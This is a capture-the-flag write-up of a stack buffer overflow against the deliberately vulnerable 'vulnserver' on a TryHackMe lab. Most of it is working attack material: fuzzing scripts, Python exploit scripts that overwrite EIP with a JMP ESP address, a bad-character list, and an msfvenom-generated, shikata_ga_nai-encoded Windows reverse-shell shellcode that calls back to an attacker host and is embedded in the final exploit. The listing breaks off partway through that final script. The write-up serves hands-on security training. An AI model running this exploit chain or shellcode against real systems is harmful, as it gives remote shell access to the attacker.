---
Category:
  - Pwn
Difficulty: Easy
Platform: TryHackMe
Status: 3. Complete
tags:
  - buffer-overflow
---
# Set up

Connect to the remote machine: `xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP`

# Information Gathering

Run `netstat -abno` command and found the which ports is associated with the vulnerable application:

![Vulnserver.exe listening port](../../zzz_res/attachments/Pasted_image_20210501144048.png)

Vulnserver.exe listening port

Verify that the port is the right one:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ nc -nvC 10.10.108.230 9999
(UNKNOWN) [10.10.108.230] 9999 (?) open
Welcome to Vulnerable Server! Enter HELP for help.
HELO
UNKNOWN COMMAND
UNKNOWN COMMAND
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
UNKNOWN COMMAND
EXIT
GOODBYE
```

![Connection to the server](../../zzz_res/attachments/Pasted_image_20210501144305.png)

Connection to the server

## Fuzzing each parameter and find the BOF

Fuzz STATS parameter:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ nano stats.spk
s_readline();
s_string("STATS ");
s_string_variable("0");

┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ generic_send_tcp 10.10.108.230 9999 stats.spk 0 0
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=Welcome to Vulnerable Server! Enter HELP for help.
Fuzzing Variable 0:1
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 5004
Fuzzing Variable 0:2
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 5005
Fuzzing Variable 0:3
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 21
Fuzzing Variable 0:4
line read=Welcome to Vulnerable Server! Enter HELP for help.
...
```

![Fuzzing packet example](../../zzz_res/attachments/Pasted_image_20210501213602.png)

Fuzzing packet example

![Server does not crash](../../zzz_res/attachments/Pasted_image_20210501213748.png)

Server does not crash

# The Bug

Fuzz TRUN parameter:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ generic_send_tcp 10.10.108.230 9999 trun.spk 0 0
Total Number of Strings is 681
Fuzzing
Fuzzing Variable 0:0
line read=Welcome to Vulnerable Server! Enter HELP for help.
Fuzzing Variable 0:1
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 5004
Fuzzing Variable 0:2
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 5005
Fuzzing Variable 0:3
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 21
Fuzzing Variable 0:4
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 3
Fuzzing Variable 0:5
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 2
Fuzzing Variable 0:6
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 7
Fuzzing Variable 0:7
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 48
Fuzzing Variable 0:8
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 45
Fuzzing Variable 0:9
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 49
Fuzzing Variable 0:10
line read=Welcome to Vulnerable Server! Enter HELP for help.
Variablesize= 46
Fuzzing Variable 0:11
```

![Server crash](../../zzz_res/attachments/Pasted_image_20210501213901.png)

Server crash

![Packet that crash the server](../../zzz_res/attachments/Pasted_image_20210501220142.png)

Packet that crash the server

# Exploitation

## Control the EIP register

Exploit to to replicate the crash:

```python
#!/usr/bin/python
import socket

payload = '/.../' + ('A' * 5000)

print "Fuzzing TRUN with %s bytes" % len(payload)
try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('10.10.108.230',9999))
        s.recv(1024)
        s.send('TRUN ' + payload)
        s.recv(1024)
        s.close()
except:
        print "\nCould not connect!"
```

![application crash and EIP overwriting](../../zzz_res/attachments/Pasted_image_20210501220611.png)

application crash and EIP overwriting

## Find the offset and control EIP

Created the pattern with msf-pattern_create:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ msf-pattern_create -l 5000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
```

Updated exploit to control EIP:

```python
#!/usr/bin/python
import socket

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0...'
payload = '/.../' + pattern
...
```

![Server crash and EIP contains a unique pattern used to calculate the offset](../../zzz_res/attachments/Pasted_image_20210501221303.png)

Server crash and EIP contains a unique pattern used to calculate the offset

Calculated the right offset in order to control EIP:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ msf-pattern_offset -l 5000 -q 6F43376F
[*] Exact match at offset 2002
```

Exploit to verify that EIP is controlled:

```python
#!/usr/bin/python
import socket

crash = 5000
offset = 'A' * 2002
EIP = 'BBBB'
filler = 'C' * (crash - (len(offset) + len(EIP)))

payload = '/.../' + offset + EIP + filler

print "Fuzzing TRUN with %s bytes" % len(payload)
try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('10.10.108.230',9999))
        s.recv(1024)
        s.send('TRUN ' + payload)
        s.recv(1024)
        s.close()
except:
        print "\nCould not connect!"
```

![EIP contains attacker’s arbitrary data](../../zzz_res/attachments/Pasted_image_20210501221946.png)

EIP contains attacker’s arbitrary data

## Find all bad chars

Exploit to identify malicious characters:

```python
#!/usr/bin/python
import socket

crash = 5000
offset = 'A' * 2002
EIP = 'BBBB'
#filler = 'C' * (crash - (len(offset) + len(EIP)))
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

payload = '/.../' + offset + EIP + badchars

print "Fuzzing TRUN with %s bytes" % len(payload)
try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('10.10.108.230',9999))
        s.recv(1024)
        s.send('TRUN ' + payload)
        s.recv(1024)
        s.close()
except:
        print "\nCould not connect!"

```

![Stack is intact and there are no other badchars](../../zzz_res/attachments/Pasted_image_20210501222259.png)

Stack is intact and there are no other badchars

## Find a place where to place the shellcode and a way to jump in

ESP is pointing directly within our shellcode, right after the EIP register:

![ESP points directly within the shellcode](../../zzz_res/attachments/Pasted_image_20210501222915.png)

ESP points directly within the shellcode

Find the right opcode for the desired instruction:

```bash
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
```

Use mona to locate a suitable module and jmp address:

![Modules without protection
](../../zzz_res/attachments/Pasted_image_20210501223909.png)

Modules without protection

![Searching for the desired opcode within the modules identified above](../../zzz_res/attachments/Pasted_image_20210501224034.png)

Searching for the desired opcode within the modules identified above

Verify that the EIP is overwritten with the right address and that it jumps within the stack:

```python
#!/usr/bin/python
import socket

ip = '10.10.254.152'
port = 9999

crash = 5000
offset = 'A' * 2002
EIP = '\x05\x12\x50\x62' # 62501205 --> FFE4 (JMP ESP)
filler = 'C' * (crash - (len(offset) + len(EIP)))

payload = '/.../' + offset + EIP + filler

print "Fuzzing TRUN with %s bytes" % len(payload)
try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((ip,port))
        s.recv(1024)
        s.send('TRUN ' + payload)
        s.recv(1024)
        s.close()
except:
        print "\nCould not connect!"
```

![EIP points to the desired instruction](../../zzz_res/attachments/Pasted_image_20210501225624.png)

EIP points to the desired instruction

## Generate the payload and obtain the reverse shell

Generate the reverse shell using msfvenom:

```python
┌──(kali㉿kali)-[~/CTFs/THM/Buffer-Overflow-Prep/vulnserver]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.8.185.241 LPORT=10099 -e x86/shikata_ga_nai -i 3 -f py EXITFUNC=thread -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai succeeded with size 378 (iteration=1)
x86/shikata_ga_nai succeeded with size 405 (iteration=2)
x86/shikata_ga_nai chosen with final size 405
Payload size: 405 bytes
Final size of py file: 1983 bytes
buf =  b""
buf += b"\xba\xf8\x97\x0e\xe5\xda\xde\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x5f\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x1a"
buf += b"\x62\xd7\x13\x03\xf9\xcc\x2f\xee\xb8\xed\x92\x58\xdf"
buf += b"\xdc\xdb\xe9\x47\x9c\x31\xf5\x49\xf7\xdf\x06\xff\xe1"
buf += b"\x3d\x1d\x67\x91\x79\xbc\xae\x43\xfc\x0b\x22\x2d\x9f"
buf += b"\x6d\x01\x5b\x45\x63\x90\xbd\xd4\xf2\x0d\xcc\x89\x16"
buf += b"\x8b\x98\x39\x41\x7d\xb2\x05\xa9\x3a\x15\xfe\xbd\xc8"
buf += b"\x12\xf8\xee\x72\x64\x07\xc2\x6b\x03\xbb\x07\x3a\x38"
buf += b"\x8b\xf4\x53\x11\xf7\xb8\x24\xb1\xc3\x90\xb5\xcd\xe4"
buf += b"\xde\x61\xd9\xa5\x23\xc6\xda\xbb\x33\xb7\x82\x5d\xf4"
buf += b"\xfb\x86\x10\xeb\x5b\x21\xca\x9d\x3d\x7c\x18\x93\x5e"
buf += b"\xce\xff\x8c\xf2\x38\xfc\x68\x12\x06\x1e\x56\xce\x9b"
buf += b"\x62\x52\x94\xdd\x28\xf5\x87\xf3\xce\x16\xe0\x89\xf6"
buf += b"\xdf\x82\xe1\x9c\x37\x95\x47\x3c\xda\x12\x6b\xf6\x12"
buf += b"\x0a\x55\xd0\xfe\x6a\xf0\xdd\x90\x3b\xbf\x41\x53\x26"
buf += b"\x64\xca\x81\xee\x8c\x6e\x30\x27\x55\xd0\x5f\x63\xd6"
buf += b"\xc9\x88\xda\x2c\x73\x18\x30\x45\xb2\x14\x6c\x6d\xf8"
buf += b"\x7e\xa3\xeb\x39\x9d\xec\x8c\x42\xb7\x12\x31\xaa\x9d"
buf += b"\xf9\xc6\x88\x07\x5e\x36\xe8\x54\xb6\x28\x22\x1c\xe8"
buf += b"\xf7\xa9\x05\xed\x42\x4a\x9d\x72\xe0\x0f\x82\xea\x88"
buf += b"\xef\x74\xd0\x88\x62\xea\x05\xf7\xb7\x1f\xff\xf2\x31"
buf += b"\xfc\x52\xd6\xe7\xe5\xe6\x5c\xef\xcc\x9b\xf1\xdc\xfa"
buf += b"\x4b\x99\x8d\x11\x0e\xb0\x81\x5e\x30\x21\x1b\xae\xb9"
buf += b"\xe6\x3a\x8b\xd4\x0d\x24\xf1\xf5\x5e\xce\xd6\x67\x36"
buf += b"\x1d\x6c\xf5\xdb\xd1\x1e\xd3\xdd\xc4\x70\xa1\x7e\xc7"
buf += b"\x10\x50\x29\xc6\xfe\x36\xd7\x69\xdf\x03\xb4\xf0\x75"
buf += b"\x30\xbd\xd9\xee\xad\x23\x94\xba\xad\x24\xff\xc9\x9e"
buf += b"\xc5\x0d\xf9\x7c\x49\x19\x02\xd5\x17\xc1\x82\x94\x23"
buf += b"\xb5\x48\x30\x6a\xa5\xcd\xd2\x0b\x13\x26\x9a\xa5\x1d"
buf += b"\x11\x9f\x07\x40\x23\x68\x3f\x06\x05\x20\x0b\x60\x11"
buf += b"\x5f\x28\x88\xbe\x29\xf8\x7d\x8f\x59\xf2\x7d\xf6\xfa"
buf += b"\x47\x64"
```

Update the exploit with the reverse shell and a NOP sled in order to favorite the shikata_ga_nai decryption process:

```python
#!/usr/bin/python
import socket

ip = '10.10.254.152'
port = 9999

crash = 5000
offset = 'A' * 2002
EIP = '\x05\x12\x50\x62' # 62501205 --> FFE4 (JMP ESP)

# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.185.241 LPORT=10099 -e x86/shikata_ga_nai -i 3 -f py EXITFUNC=thread -b "\x00"
buf =  b""
buf += b"\xba\xf8\x97\x0e\xe5\xda\xde\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x5f\x31\x56\x14\x83\xee\xfc\x03\x56\x10\x1a"
buf += b"\x62\xd7\x13\x03\xf9\xcc\x2f\xee\xb8\xed\x92\x58\xdf"
buf += b"\xdc\xdb\xe9\x47\x9c\x31\xf5\x49\xf7\xdf\x06\xff\xe1"
buf += b"\x3d\x1d\x67\x91\x79\xbc\xae\x43\xfc\x0b\x22\x2d\x9f"
buf += b"\x6d\x01\x5b\x45\x63\x90\xbd\xd4\xf2\x0d\xcc\x89\x16"
buf += b"\x8b\x98\x39\x41\x7d\xb2\x05\xa9\x3a\x15\xfe\xbd\xc8"
buf += b"\x12\xf8\xee\x72\x64\x07\xc2\x6b\x03\xbb\x07\x3a\x38"
buf += b"\x8b\xf4\x53\x11\xf7\xb8\x24\xb1\xc3\x90\xb5\xcd\xe4"
buf += b"\xde\x61\xd9\xa5\x23\xc6\xda\xbb\x33\xb7\x82\x5d\xf4"
buf += b"\xfb\x86\x10\xeb\x5b\x21\xca\x9d\x3d\x7c\x18\x93\x5e"
buf += b"\xce\xff\x8c\xf2\x38\xfc\x68\x12\x06\x1e\x56\xce\x9b"
buf += b"\x62\x52\x94\xdd\x28\xf5\x87\xf3\xce\x16\xe0\x89\xf6"
buf += b"\xdf\x82\xe1\x9c\x37\x95\x47\x3c\xda\x12\x6b\xf6\x12"
buf += b"\x0a\x55\xd0\xfe\x6a\xf0\xdd\x90\x3b\xbf\x41\x53\x26"
buf += b"\x64\xca\x81\xee\x8c\x6e\x30\x27\x55\xd0\x5f\x63\xd6"
buf += b"\xc9\x88\xda\x2c\x73\x18\x30\x45\xb2\x14\x6c\x6d\xf8"
buf += b"\x7e\xa3\xeb\x39\x9d\xec\x8c\x42\xb7\x12\x31\xaa\x9d"
buf += b"\xf9\xc6\x88\x07\x5e\x36\xe8\x54\xb6\x28\x22\x1c\xe8"
buf += b"\xf7\xa9\x05\xed\x42\x4a\x9d\x72\xe0\x0f\x82\xea\x88"
buf += b"\xef\x74\xd0\x88\x62\xea\x05\xf7\xb7\x1f\xff\xf2\x31"
buf += b"\xfc\x52\xd6\xe7\xe5\xe6\x5c\xef\xcc\x9b\xf1\xdc\xfa"
buf += b"\x4b\x99\x8d\x11\x0e\xb0\x81\x5e\x30\x21\x1b\xae\xb9"
buf += b"\xe6\x3a\x8b\xd4\x0d\x24\xf1\xf5\x5e\xce\xd6\x67\x36"
buf += b"\x1d\x6c\xf5\xdb\xd1\x1e\xd3\xdd\xc4\x70\xa1\x7e\xc7"
buf += b"\x10\x50\x29\xc6\xfe\x36\xd7\x69\xdf\x03\xb4\xf0\x75"
